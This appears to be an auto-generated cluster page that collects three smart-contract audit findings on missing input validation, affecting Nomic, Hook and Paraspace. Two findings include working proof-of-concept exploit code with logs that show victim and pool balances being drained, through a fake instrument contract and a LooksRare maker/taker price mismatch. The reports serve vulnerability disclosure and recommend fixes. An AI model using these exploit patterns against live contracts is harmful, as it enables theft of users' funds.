# Cluster -1417

**Rank:** #415  
**Count:** 11  

## Label
Insufficient input validation and missing cross-checks between order parameters enable attackers to manipulate transaction values, inflate prices, or bypass validation, leading to fund theft or unauthorized asset transfers.

## Cluster Information
- **Total Findings:** 11

## Examples

### Example 1

**Auto Label:** Lack of input validation and type boundaries enables attackers to forge, manipulate, or misroute assets, leading to fund loss, data exposure, or system misbehavior through ambiguous or inconsistent data handling.  

**Original Text Preview:**

## Target: nomic/src/app.rs

## Description

Deposits to the Nomic sidechain from Bitcoin accounts include a commitment to a destination, indicating where the sidechain funds should be sent. Due to a lack of domain separation, a malicious relayer could cause deposited funds to be redirected to an ETH account rather than a Nomic native sidechain account. 

Figure 7.1 shows the commitment formats for each type of account:

```rust
pub fn commitment_bytes(&self) -> Result<Vec<u8>> {
    use sha2::{Digest, Sha256};
    use Dest::*;

    let bytes = match self {
        NativeAccount(addr) => addr.bytes().into(),
        Ibc(dest) => Sha256::digest(dest.encode()?).to_vec(),
        Fee => vec![1],
        EthAccount(addr) => addr.bytes().into(),
        EthCall(call, addr) => Sha256::digest((call.clone(), *addr).encode()?).to_vec(),
    };

    Ok(bytes)
}
```

Figure 1.1: Commitments for `NativeAccount` and `EthAccount` use the same 20-byte format (nomic/src/app.rs#1153–1165).

The `NativeAccount` and `EthAccount` destinations both use arbitrary 20-byte strings, while the `Ibc` and `EthCall` formats use Sha256 digests of arbitrary-length data. A malicious relayer could process a deposit using an `EthAccount` rather than the depositor’s `NativeAccount`, in which case the deposited funds would be burned.

Note that the client had already addressed this issue before the start of the review, but the updated code was not included in the commit under review.

## Exploit Scenario

A malicious relayer wants to harm depositors or the network’s reputation. She relays all incoming native deposits as `EthAccount` deposits, causing the deposited funds to be sent to an Ethereum account for which nobody holds the private key.

## Recommendations

- **Short term**: Serialize all commitments using unique prefixes to indicate what type of deposit the commitment is for.
- **Long term**: Document the formats of all commitments and message hashing schemes for signatures. Ensure that commitments and message encodings are injective by providing a decoding routine that can be used in unit testing.

---
### Example 2

**Auto Label:** Insufficient input validation and missing cross-checks between order parameters enable attackers to manipulate transaction values, inflate prices, or bypass validation, leading to fund theft or unauthorized asset transfers.  

**Original Text Preview:**

The `optionInstrumentationAddress` that is inputted by the seller as an argument to the `sellOption()` function is used for all checks within the function. The `optionMarketAddress` that is a part of the signed order is ignored, and the two are not validated against one another.

Because of this insufficient parameter validation, a malicious seller can create a fake instrument with the following properties:

- `getStrikePrice()` returns `1` (to maximize option value)
- `getExpiration()` returns the maximum time the user will allow (to maximize option value)
- `safeTransferFrom()` does not revert

Here is an example of the simplest version of such a contract:

```solidity
contract FakeInstrument {
function getStrikePrice(uint id) public pure returns (uint) {
return 1;
}

function getExpiration(uint id) public view returns (uint) {
return block.timestamp + 79 days;
}

function safeTransferFrom(address from, address to, uint id) public {}
}
```

They can then call `sellOption()` with this fake instrument, and a value for `saleProceeds` that equals the lower of `underlying asset price - fee - 1` or `user's WETH balance - fee`.

Let's trace the flow of this attack through the contract:

1. In `_performSellOptionOrderChecks()`, we grab the strike price and expiration directly from the inputted contract. We can set the expiry to ensure we pass the checks ensuring that the expiration time is between `block.timestamp + order.minOptionDuration` and `block.timestamp + order.maxOptionDuration`.

2. The strike price and expiry are used in `_computeOptionAskAndBid()` to determine the price. By setting the strike price to 1, Black Scholes will return a value for the option of approximately the full price of the underlying asset. We also pass the `bid >= ask` check, because the bid will equal the underlying asset price, while we calculated the `saleProceed` value to ensure that, even with the fee added, it would stay below this threshold.

3. We also call `_validateOptionProperties()` with this address, but we can specify the return values from calls to the contract however we want to ensure we pass the `validateProperty` checks.

4. Finally, we call `safeTransferFrom()` on our phony address, which will transfer nothing to the buyer.

5. We then transfer `saleProceeds` from the maker to ourselves, and the fee to the protocol. Because we set `saleProceeds` intentionally to ensure that the resulting value would be less than or equal to the user's WETH balance, these transactions succeed and we steal the assets from the user.

**Proof of Concept**

Here is a drop in test that can be added to your `HookBidPoolTest.t.sol` file to validate the finding.

In this case, I've assumed an underlying asset value of 50 ETH to take advantage of the user's account balance of 50 ETH, but other than that, used the original test setup and signing.

```solidity
function testZach__StealWithFakeInstrument() public {
vm.warp(block.timestamp + 20 days);
PoolOrders.Order memory order = _makeDefaultOrder();
(Signatures.Signature memory signature, bytes32 orderHash) = _signOrder(order, bidderPkey);

address fakeInstrument = address(new FakeInstrument());

console.log("Victim Starting Balance: ", weth.balanceOf(address(bidder)));
console.log("Attacker Starting Balance: ", weth.balanceOf(address(seller)));

vm.prank(address(seller));
bidPool.sellOption(
order,
signature,
_makeAssetPriceClaim(50 ether),
_makeOrderClaim(orderHash),
47.5 ether,
fakeInstrument,
0
);

console.log("Victim Ending Balance: ", weth.balanceOf(address(bidder)));
console.log("Attacker Ending Balance: ", weth.balanceOf(address(seller)));
}
```

Output:

```
Logs:
Victim Starting Balance:  50000000000000000000
Attacker Starting Balance:  0
Victim Ending Balance:  125000000000000000
Attacker Ending Balance:  47500000000000000000
```

**Recommendations**

Verify that `order.optionMarketAddress == optionInstrumentAddress` for all calls to `sellOption()`.

**Review**

Fixed in [PR #104](https://github.com/hookart/protocol/pull/104/) by removing the `optionInstrumentAddress` argument altogether and always using `order.optionMarketAddress`.

---
### Example 3

**Auto Label:** Insufficient input validation and missing cross-checks between order parameters enable attackers to manipulate transaction values, inflate prices, or bypass validation, leading to fund theft or unauthorized asset transfers.  

**Original Text Preview:**

<https://github.com/code-423n4/2022-11-paraspace/blob/c6820a279c64a299a783955749fdc977de8f0449/paraspace-core/contracts/misc/marketplaces/LooksRareAdapter.sol#L59><br>
<https://github.com/code-423n4/2022-11-paraspace/blob/c6820a279c64a299a783955749fdc977de8f0449/paraspace-core/contracts/protocol/libraries/logic/MarketplaceLogic.sol#L397>

Paraspace supports leveraged purchases of NFTs through PoolMarketplace entry points. User calls buyWithCredit with marketplace, calldata to be sent to marketplace, and how many tokens to borrow.

    function buyWithCredit(
        bytes32 marketplaceId,
        bytes calldata payload,
        DataTypes.Credit calldata credit,
        uint16 referralCode
    ) external payable virtual override nonReentrant {
        DataTypes.PoolStorage storage ps = poolStorage();
        MarketplaceLogic.executeBuyWithCredit(
            marketplaceId,
            payload,
            credit,
            ps,
            ADDRESSES_PROVIDER,
            referralCode
        );
    }

In executeBuyWithCredit, orders are deserialized from the payload user sent to a DataTypes.OrderInfo structure. Each MarketplaceAdapter is required to fulfil that functionality through getAskOrderInfo:

    DataTypes.OrderInfo memory orderInfo = IMarketplace(marketplace.adapter)
        .getAskOrderInfo(payload, vars.weth);

If we take a look at LooksRareAdapter's getAskOrderInfo, it will the consideration parameter using only the MakerOrder parameters, without taking into account TakerOrder params

    (
        OrderTypes.TakerOrder memory takerBid,
        OrderTypes.MakerOrder memory makerAsk
    ) = abi.decode(params, (OrderTypes.TakerOrder, OrderTypes.MakerOrder));
    orderInfo.maker = makerAsk.signer;

    consideration[0] = ConsiderationItem(
        itemType,
        token,
        0,
        makerAsk.price, // TODO: take minPercentageToAsk into account
        makerAsk.price,
        payable(takerBid.taker)
    );

The OrderInfo constructed, which contains the consideration item from maker, is used in \_delegateToPool, called by \_buyWithCredit(), called by executeBuyWithCredit:

    for (uint256 i = 0; i < params.orderInfo.consideration.length; i++) {
        ConsiderationItem memory item = params.orderInfo.consideration[i];
        require(
            item.startAmount == item.endAmount,
            Errors.INVALID_MARKETPLACE_ORDER
        );
        require(
            item.itemType == ItemType.ERC20 ||
                (vars.isETH && item.itemType == ItemType.NATIVE),
            Errors.INVALID_ASSET_TYPE
        );
        require(
            item.token == params.credit.token,
            Errors.CREDIT_DOES_NOT_MATCH_ORDER
        );
        price += item.startAmount;
    }

The total price is charged to msg.sender, and he will pay it with debt tokens + immediate downpayment.
After enough funds are transfered to the Pool contract, it delegatecalls to the LooksRare adapter, which will do the actual call to LooksRareExchange. The exchange will send the money gathered in the pool to maker, and give it the NFT.

The issue is that attacker can supply a different price in the MakerOrder and TakerOrder passed as payload to LooksRare. The maker price will be reflected in the registered price charged to user, but taker price will be the one actually transferred from Pool.

To show taker price is what counts, this is the code in LooksRareExchange.sol:

    function matchAskWithTakerBid(OrderTypes.TakerOrder calldata takerBid, OrderTypes.MakerOrder calldata makerAsk)
        external
        override
        nonReentrant
    {
        require((makerAsk.isOrderAsk) && (!takerBid.isOrderAsk), "Order: Wrong sides");
        require(msg.sender == takerBid.taker, "Order: Taker must be the sender");
        // Check the maker ask order
        bytes32 askHash = makerAsk.hash();
        _validateOrder(makerAsk, askHash);
        (bool isExecutionValid, uint256 tokenId, uint256 amount) = IExecutionStrategy(makerAsk.strategy)
            .canExecuteTakerBid(takerBid, makerAsk);
        require(isExecutionValid, "Strategy: Execution invalid");
        // Update maker ask order status to true (prevents replay)
        _isUserOrderNonceExecutedOrCancelled[makerAsk.signer][makerAsk.nonce] = true;
        // Execution part 1/2
        _transferFeesAndFunds(
            makerAsk.strategy,
            makerAsk.collection,
            tokenId,
            makerAsk.currency,
            msg.sender,
            makerAsk.signer,
            takerBid.price,   <--- taker price is what's charged
            makerAsk.minPercentageToAsk
        );
    	...
    }

Since attacker will be both maker and taker in this flow,  he has no problem in supplying a strategy which will accept higher taker price than maker price. It will pass this check:

    (bool isExecutionValid, uint256 tokenId, uint256 amount) = IExecutionStrategy(makerAsk.strategy)
        .canExecuteTakerBid(takerBid, makerAsk);

It is important to note that for this exploit we can pass a 0 credit loan amount, which allows the stolen asset to be any asset, not just ones supported by the pool. This is because of early return in `_borrowTo()` and `\repay()` functions.

The attack POC looks as follows:

1.  Taker (attacker) has 10 DAI
2.  Pool has 990 DAI
3.  Maker (attacker) has 1 doodle NFT.
4.  Taker submits buyWithCredit() transaction:

*   credit amount 0
*   TakerOrder with 1000 amount
*   MakerOrder with 10 amount and "accept all" execution strategy

5.  Pool will take the 10 DAI from taker and additional 990 DAI from it's own funds and send to Maker.
6.  Attacker ends up with both 1000 DAI and an nToken of the NFT

### Impact

Any ERC20 tokens which exist in the pool contract can be drained by an attacker.

### Proof of Concept

In `_pool_marketplace_buy_wtih_credit.spec.ts`, add this test:

    it("looksrare attack", async () => {
      const {
        doodles,
        dai,
        pool,
        users: [maker, taker, middleman],
      } = await loadFixture(testEnvFixture);
      const payNowNumber = "10";
      const poolVictimNumber = "990";
      const payNowAmount = await convertToCurrencyDecimals(
        dai.address,
        payNowNumber
      );
      const poolVictimAmount = await convertToCurrencyDecimals(
        dai.address,
          poolVictimNumber
      );
      const totalAmount = payNowAmount.add(poolVictimAmount);
      const nftId = 0;
      // mint DAI to offer
      // We don't need to give taker any money, he is not charged
      // Instead, give the pool money
      await mintAndValidate(dai, payNowNumber, taker);
      await mintAndValidate(dai, poolVictimNumber, pool);
      // middleman supplies DAI to pool to be borrowed by offer later
      //await supplyAndValidate(dai, poolVictimNumber, middleman, true);
      // maker mint mayc
      await mintAndValidate(doodles, "1", maker);
      // approve
      await waitForTx(
        await dai.connect(taker.signer).approve(pool.address, payNowAmount)
      );
      console.log("maker balance before", await dai.balanceOf(maker.address))
      console.log("taker balance before", await dai.balanceOf(taker.address))
      console.log("pool balance before", await dai.balanceOf(pool.address))
      await executeLooksrareBuyWithCreditAttack(
        doodles,
        dai,
        payNowAmount,
        totalAmount,
        0,
        nftId,
        maker,
        taker
      );

In `marketplace-helper.ts`, please copy in the following attack code:

    export async function executeLooksrareBuyWithCreditAttack(
        tokenToBuy: MintableERC721 | NToken,
        tokenToPayWith: MintableERC20,
        makerAmount: BigNumber,
        takerAmount: BigNumber,
        creditAmount : BigNumberish,
        nftId: number,
        maker: SignerWithAddress,
        taker: SignerWithAddress
    ) {
      const signer = DRE.ethers.provider.getSigner(maker.address);
      const chainId = await maker.signer.getChainId();
      const nonce = await maker.signer.getTransactionCount();

      // approve
      await waitForTx(
          await tokenToBuy
              .connect(maker.signer)
              .approve((await getTransferManagerERC721()).address, nftId)
      );

      const now = Math.floor(Date.now() / 1000);
      const paramsValue = [];
      const makerOrder: MakerOrder = {
        isOrderAsk: true,
        signer: maker.address,
        collection: tokenToBuy.address,
        // Listed Maker price not includes payLater amount which is stolen
        price: makerAmount,
        tokenId: nftId,
        amount: "1",
        strategy: (await getStrategyStandardSaleForFixedPrice()).address,
        currency: tokenToPayWith.address,
        nonce: nonce,
        startTime: now - 86400,
        endTime: now + 86400, // 2 days validity
        minPercentageToAsk: 7500,
        params: paramsValue,
      };

      const looksRareExchange = await getLooksRareExchange();

      const {domain, value, type} = generateMakerOrderTypedData(
          maker.address,
          chainId,
          makerOrder,
          looksRareExchange.address
      );

      const signatureHash = await signer._signTypedData(domain, type, value);

      const makerOrderWithSignature: MakerOrderWithSignature = {
        ...makerOrder,
        signature: signatureHash,
      };

      const vrs = DRE.ethers.utils.splitSignature(
          makerOrderWithSignature.signature
      );

      const makerOrderWithVRS: MakerOrderWithVRS = {
        ...makerOrderWithSignature,
        ...vrs,
      };
      const pool = await getPoolProxy();
      const takerOrder: TakerOrder = {
        isOrderAsk: false,
        taker: pool.address,
        price: takerAmount,
        tokenId: makerOrderWithSignature.tokenId,
        minPercentageToAsk: 7500,
        params: paramsValue,
      };

      const encodedData = looksRareExchange.interface.encodeFunctionData(
          "matchAskWithTakerBid",
          [takerOrder, makerOrderWithVRS]
      );

      const tx = pool.connect(taker.signer).buyWithCredit(
          LOOKSRARE_ID,
          `0x${encodedData.slice(10)}`,
          {
            token: tokenToPayWith.address,
            amount: creditAmount,
            orderId: constants.HashZero,
            v: 0,
            r: constants.HashZero,
            s: constants.HashZero,
          },
          0,
          {
            gasLimit: 5000000,
          }
      );

      await (await tx).wait();
    }

Finally, we need to change the passed execution strategy. In `StrategyStandardSaleForFixedPrice.sol`, change `canExecuteTakerBid`:

    function canExecuteTakerBid(OrderTypes.TakerOrder calldata takerBid, OrderTypes.MakerOrder calldata makerAsk)
        external
        view
        override
        returns (
            bool,
            uint256,
            uint256
        )
    {
        return (
            //((makerAsk.price == takerBid.price) &&
            //    (makerAsk.tokenId == takerBid.tokenId) &&
            //    (makerAsk.startTime <= block.timestamp) &&
            //    (makerAsk.endTime >= block.timestamp)),
            true,
            makerAsk.tokenId,
            makerAsk.amount
        );
    }

We can see the output:

```
maker balance before BigNumber { value: "0" }
taker balance before BigNumber { value: "10000000000000000000" }
pool balance before BigNumber { value: "990000000000000000000" }
maker balance after BigNumber { value: "1000000000000000000000" }
taker balance after BigNumber { value: "0" }
pool balance after BigNumber { value: "0" }

  Leveraged Buy - Positive tests
    ✔ looksrare attack (34857ms)


  1 passing (54s)

```

### Recommended Mitigation Steps

It is important to validate that the price charged to user is the same price taken from the Pool contract:

    // In LooksRareAdapter's getAskOrderInfo:
    require(makerAsk.price, takerBid.price)



***

---
